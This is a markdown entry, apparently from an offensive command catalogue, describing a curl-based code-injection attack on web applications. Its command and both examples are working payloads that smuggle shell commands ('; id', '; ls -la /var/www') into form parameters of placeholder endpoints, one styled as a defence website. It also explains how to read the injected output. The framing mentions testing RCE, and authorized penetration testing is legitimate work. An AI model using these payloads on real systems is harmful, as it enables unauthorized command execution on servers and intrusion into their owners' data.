---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: >-
  curl -X POST 'https://target.example/vulnerable' -d 'input=; command' --output
  response.html
name: curl-code-injection
tags:
  - web-exploit
  - rce
  - injection
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:24.504Z'
verified: false
validated: true
submitted: true
---
# curl-code-injection

## Command

```bash
curl -X POST 'https://target.example/vulnerable' -d 'input=; command' --output response.html
```

## Description

This command uses curl to send an HTTP POST request with a code injection payload to a vulnerable web endpoint, exploiting unsanitized input to execute a server-side command. It's useful for testing RCE in web applications where input is passed to a code interpreter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://target.example/vulnerable'` | The URL of the vulnerable endpoint | Yes |
| `-d 'input=; command'` | The data payload with injection (replace 'command' with actual cmd like 'id') | Yes |
| `--output response.html` | Saves the response to a file for analysis | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://dod-website.example/search' -d 'q=; id'
```

### Advanced Usage

```bash
curl -X POST 'https://dod-website.example/api' -d 'param=; ls -la /var/www' -H 'Content-Type: application/x-www-form-urlencoded' --output detailed-response.html
```

## Expected Output

The HTTP response body will contain the output of the injected command if successful, such as 'uid=33(www-data) gid=33(www-data)' for 'id', embedded alongside normal page content. Errors may indicate failed injection.

## Related

- [[Related Procedure|procedures/Exploit-Code-Injection-for-RCE]]
